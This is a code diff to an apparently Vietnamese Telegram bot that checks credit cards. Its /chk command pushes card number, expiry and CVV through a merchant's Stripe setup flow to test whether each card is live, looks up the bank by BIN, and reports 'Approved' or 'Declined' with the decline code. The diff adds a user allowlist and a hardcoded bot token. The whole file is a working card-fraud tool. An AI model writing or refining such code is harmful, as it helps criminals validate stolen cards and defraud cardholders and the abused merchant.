@@ -3,9 +3,31 @@ from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from bs4 import BeautifulSoup
 
+# CẤU HÌNH TOKEN & QUYỀN
+TELEGRAM_TOKEN = "7482122603:AAG-d2VwSvySZhKfNYpjz9HXnlduvgETYQ4"
+ALLOWED_USER_IDS = {5127429005}
+
+# HEADER CHUNG
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
+}
+
+# THÊM NGƯỜI DÙNG
+async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != 5127429005:
+        await update.message.reply_text("❌ Chỉ admin được thêm người dùng.")
+        return
+    if not context.args or not context.args[0].isdigit():
+        await update.message.reply_text("❌ Dùng đúng cú pháp: /add <user_id>")
+        return
+    new_id = int(context.args[0])
+    ALLOWED_USER_IDS.add(new_id)
+    await update.message.reply_text(f"✅ Đã thêm user {new_id} vào danh sách.")
+
+# HÀM KIỂM TRA THẺ
 async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ALLOWED_USER_ID:
-        await update.message.reply_text("❌ Không có quyền sử dụng bot này.")
+    if update.effective_user.id not in ALLOWED_USER_IDS:
+        await update.message.reply_text("❌ Bạn không có quyền sử dụng bot này.")
         return
 
     if not context.args:
@@ -36,7 +58,7 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         setid = json2["setup_intent"]
         setin = setid.split("_secret_")[0]
 
-        # Bước 3: Xác nhận
+        # Bước 3: Xác nhận thẻ
         payload = {
             "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
             "payment_method_data[type]": "card",
@@ -67,9 +89,9 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         status = j3.get("status", "UNKNOWN")
         decline = j3.get("error", {}).get("decline_code", "NONE")
 
-        # BIN lookup
+        # Lấy BIN info
         bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}", headers={
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+            "User-Agent": HEADERS["User-Agent"],
             "Accept": "*/*",
             "Pragma": "no-cache"
         })
@@ -89,6 +111,7 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 <b>CC:</b> {cc}|{mes}|{ano}|{cvv}
 <b>Status:</b> {'✅ Approved' if status == 'succeeded' else '❌ Declined'}
+<b>Decline Code:</b> {decline}
 
 <b>Gateway:</b> Stripe
 <b>Card:</b> {card.upper()}
@@ -98,13 +121,14 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <b>Bank:</b> {bank}
 
 <b>Took:</b> {elapsed} sec
-<b>Checked by:</b> mnhat [5127429005]
+<b>Checked by:</b> mnhat [{update.effective_user.id}]
 """
         await update.message.reply_html(msg)
 
     except Exception as e:
         await update.message.reply_text(f"❌ Lỗi xử lý: {str(e)}")
 
+# KHỞI ĐỘNG BOT
 if __name__ == '__main__':
     app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
     app.add_handler(CommandHandler("chk", chk))
